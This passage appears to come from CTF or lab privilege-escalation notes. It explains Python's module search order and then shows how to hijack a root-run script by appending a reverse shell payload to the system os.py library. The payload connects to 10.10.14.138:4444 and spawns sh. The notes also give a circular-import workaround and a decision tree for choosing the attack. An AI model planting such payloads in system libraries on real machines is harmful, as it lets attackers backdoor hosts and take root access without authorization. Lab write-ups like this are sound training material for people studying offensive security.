## Step 3 — Understand Python Module Search Order

When Python runs `import os`, it searches these directories in order:

1. Directory of the script being executed (`/opt/server_admin/`)
2. `/usr/lib/python2.7`
3. `/usr/lib/python2.7/plat-x86_64-linux-gnu`
4. `/usr/lib/python2.7/lib-tk`
5. `/usr/lib/python2.7/lib-old`
6. `/usr/lib/python2.7/lib-dynload`
7. `/usr/local/lib/python2.7/dist-packages`
8. `/usr/lib/python2.7/dist-packages`

To check on any system:

```bash
python -c 'import sys; print "\n".join(sys.path)'
```

> [!TIP]
> **Attack vector**: If we can't modify the script itself, check if any of the **libraries it imports** are writable. Check each directory in the search order for write permissions.

## Step 5 — Inject Reverse Shell into `os.py`

![](attachments/Pasted%20image%2020260921203543.png)

Edit `os.py` — append the payload at the **very end** of the file:

```bash
nano /usr/lib/python2.7/os.py
```

> [!CAUTION]
> **Do NOT modify or delete existing functions in `os.py`** — other system scripts depend on them. Only **append** to the bottom.

### Reverse Shell Payload (Modified for `os.py`)

```python
import socket,subprocess
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.138",4444))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
import pty
pty.spawn("sh")
```

> [!WARNING]
> **Why this is different from a standard Python reverse shell:**
> 
> The standard one-liner uses `os.dup2()` — but we're **inside** `os.py` itself. Using `import os` inside `os.py` causes a **circular import** problem.
> 
> **Fix**: Call `dup2()` directly (without `os.` prefix) — the function is already available in `os.py`'s own namespace.
> 
> ```
> Inside os.py:
> 
> import os       → Circular self-import → FAILS
> os.dup2(...)    → FAILS
> 
> dup2(...)       → Uses function already in os.py → WORKS
> ```

The reason is you added the reverse-shell code inside `os.py` itself.

### 1. Why the one-line version failed

Your one-line payload contains:

```
import socket,subprocess,os
```

But you are already executing inside:

```
/usr/lib/python2.7/os.py
```

When Python executes `import os` from inside `os.py`, it can encounter a circular/self-import problem. The `os` module may still be partially initialized, so `os.dup2()` may not behave as expected.

### 2. Why the modified version worked

Your working version uses:

```
dup2(s.fileno(), 0)
```

instead of:

```
os.dup2(s.fileno(), 0)
```

The `os.py` module already exposes `dup2` in its own namespace (through the functions imported from the underlying operating-system module). Therefore, calling `dup2()` directly can work without importing `os` again.

## Decision Tree — When Absolute Paths Are Used

```
pspy shows root running /absolute/path/to/script.py
        ↓
Can you overwrite the script?
  YES → Replace contents with reverse shell
  NO  ↓
What libraries does it import?
        ↓
Check Python module search order for writable .py files
        ↓
Found writable library (e.g., os.py)?
  YES → Append reverse shell payload
  NO  → Look for other attack vectors
```
